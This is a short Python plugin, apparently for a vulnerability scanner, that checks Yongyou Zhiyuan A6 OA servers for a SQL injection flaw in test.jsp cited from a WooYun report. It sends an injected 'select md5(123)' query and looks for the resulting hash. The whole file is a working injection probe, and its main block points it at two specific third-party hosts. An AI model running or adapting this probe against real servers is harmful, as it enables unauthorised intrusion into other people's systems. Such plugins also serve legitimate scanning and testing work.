#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0155953
"""

def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg

def audit(arg):
    url = 'yyoa/common/js/menu/test.jsp?doType=101&S1=select%20md5(123)'
    target = arg + url
    code, head, res, errcode, _ = curl.curl2(target)
    if code ==200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://oa.juntongtongxin.com/')[1])
    audit(assign('yongyou_zhiyuan_a6', 'http://110.167.194.10:8081/')[1])